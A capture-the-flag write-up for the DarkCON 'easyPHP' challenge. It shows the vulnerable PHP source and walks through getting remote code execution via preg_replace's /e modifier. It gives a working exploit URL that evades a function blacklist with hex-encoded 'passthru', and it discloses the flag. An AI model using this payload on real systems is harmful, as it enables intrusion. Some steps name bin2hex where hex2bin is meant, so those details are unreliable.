# easyPHP

to get flag:
http://easy-php.darkarmy.xyz/?bruh=call_user_func(hex2bin(%277061737374687275%27),%27cat%20flag210d9f88fd1db71b947fbdce22871b57.php%27)&nic3=/!!/e

#

- use gobuster to find robots.txt

- see "?lmao" is disallowed

- add ?lmao=something query string

- see code for page.
```
<?php
require_once 'config.php';

$text = "Welcome DarkCON CTF !!";

if (isset($_GET['lmao'])) {
    highlight_file(__FILE__);
    exit;
}
else {
    $payload = $_GET['bruh'];
    if (isset($payload)) {
        if (is_payload_danger($payload)) {
            die("Amazing Goob JOb You :) ");
        }
        else {
            echo preg_replace($_GET['nic3'], $payload, $text);
        }
    }
    echo $text;
}
?>
```
- see that preg_replace finds instances of whatever is in the ?nic3 query parameter, replaces the text (default "Welcome DarkCON CTF !!"), with
  whatever is in the ?bruh query parameter

- do some searching on preg_replace function and see that adding /e to the regex (in ?nic3) will eval the replacement (in ?bruh)
- try putting stuff like system(), passthru(), exec() in ?bruh, and it dies with the message "Amazing Goob JOb You :) " because they are blacklisted in is_payload_danger
    - notice that is_payload_danger is probably just doing a regex on a bunch of function name that allow system commands

- while looking at documentation for eval(), notice that call_user_func exists which allows you to pass the name of a function and arguments to call it with
    - trying this with an arg like 'passthru' still gets blocked by _is_payload_danger

- hex encode 'passhtru' to 7061737374687275 and call bin2hex() in first argument of call_user_func to get it back to a normal string, then can put 'ls' in second
  argument to see contents of directory

- see a file called flag210d9f88fd1db71b947fbdce22871b57.php in the output, do the same thing as above but instead of passing 'ls' pass 'cat flag210d9f88fd1db71b947fbdce22871b57.php'
  to see contents of file

- get flag darkCON{w3lc0me_D4rkC0n_CTF_2O21_ggwp!!!!}